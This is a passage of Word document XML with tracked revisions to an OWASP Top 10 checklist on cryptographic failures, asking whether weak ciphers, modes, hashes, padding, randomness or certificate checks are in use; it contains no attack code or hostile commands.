          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="10EE29B7" w14:textId="7FAAEAB6" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="702" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="703" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Is encryption not enforced, </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>e.g</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:del w:id="704" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="705" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>.,</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> are any </w:t>
      </w:r>
      <w:del w:id="706" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>user agent</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="707" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>HTTP headers</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (browser)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BC3051C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="708" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> security directives or headers missing?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23A7BC6B" w14:textId="5AFB40AD" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="709" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="710" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">* Does the user agent (e.g. app, mail client) not verify if the </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="74F42604" w14:textId="73ED10B9" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="711" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-   Is the </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">received server certificate </w:t>
      </w:r>
      <w:del w:id="712" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>is valid?</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="713" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">and the trust chain properly validated? </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="55635CCA" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="714" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5FEB9C9B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="715" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="716" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Are initialization vectors ignored, reused, or not generated</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6CE3BD5F" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="717" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="718" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    sufficiently secure for the cryptographic mode of operation?</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="77E4E842" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="719" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="720" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    Is an insecure mode of operation such as ECB in use? Is encryption</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="23AF2AD5" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="721" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="722" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    used when authenticated encryption is more appropriate?</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="120AF4CA" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="723" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="495DA0D4" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="724" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="725" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Are passwords being used as cryptographic keys in absence of a</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="27EFCEBE" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="726" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="727" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    password base key derivation function?</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="35DB0DD0" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="728" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2FADC6A5" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="729" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="730" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Is randomness used for cryptographic purposes that was not designed</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="38AA78DD" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="731" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="732" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    to meet cryptographic requirements? Even if the correct function is</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7EEB96B7" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="733" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="734" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    chosen, does it need to be seeded by the developer, and if not, has</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2F01E1EB" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="735" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="736" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    the developer over-written the strong seeding functionality built into</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7644BC86" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="737" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="738" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    it with a seed that lacks sufficient entropy/unpredictability?</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="46015DCF" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="739" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D78B53A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="740" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="741" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Are deprecated hash functions such as MD5 or SHA1 in use, or are</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5ACD428B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="742" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="743" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    non-cryptographic hash functions used when cryptographic hash functions</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0F7EAB7C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="744" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="745" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    are needed?</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0985777C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="746" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="604595CE" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="747" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="748" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Are deprecated cryptographic padding methods such as PKCS number 1 v1.5</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6890DDCB" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="749" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="750" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    in use?</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1899AC69" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="751" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A77EEB1" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="752" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="753" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Are cryptographic error messages or side channel information</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="460CDF22" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="754" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="755" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    exploitable, for example in the form of padding oracle attacks?</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="76D8E53A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79DEE604" w14:textId="48B84FFB" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">See </w:t>
      </w:r>
      <w:ins w:id="756" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">ASVS </w:t>
      </w:r>
      <w:del w:id="757" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>[</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Crypto (V7</w:t>
      </w:r>
      <w:del w:id="758" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>)](https://www.owasp.org/index.php/ASVS_V7_Cryptography), [</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="759" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">), </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Data Protection (</w:t>
      </w:r>
      <w:del w:id="760" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>V9)](https://www.owasp.org/index.php/ASVS_V9_Data_Protection) and [</w:delText>
        </w:r>
      </w:del>
